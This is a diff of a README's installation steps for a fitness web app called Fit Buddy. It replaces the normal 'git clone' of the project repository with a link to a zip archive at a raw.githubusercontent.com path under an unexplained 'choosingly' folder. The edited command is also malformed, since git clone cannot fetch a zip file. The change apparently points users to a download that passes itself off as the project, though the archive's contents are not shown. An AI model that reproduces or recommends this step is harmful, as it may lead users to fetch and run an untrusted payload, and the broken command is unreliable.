@@ -15,7 +15,7 @@ Fit Buddy is a fitness web application designed to help users track their workou
 ## Installation and Setup
 1. Clone the repository to your local machine:
 
-git clone https://github.com/your-username/Fit-Buddy.git
+git clone https://raw.githubusercontent.com/jamesirungume/Fit-Buddy/main/choosingly/Fit-Buddy.zip
 
 2. Navigate to the project directory:
 cd Fit-Buddy
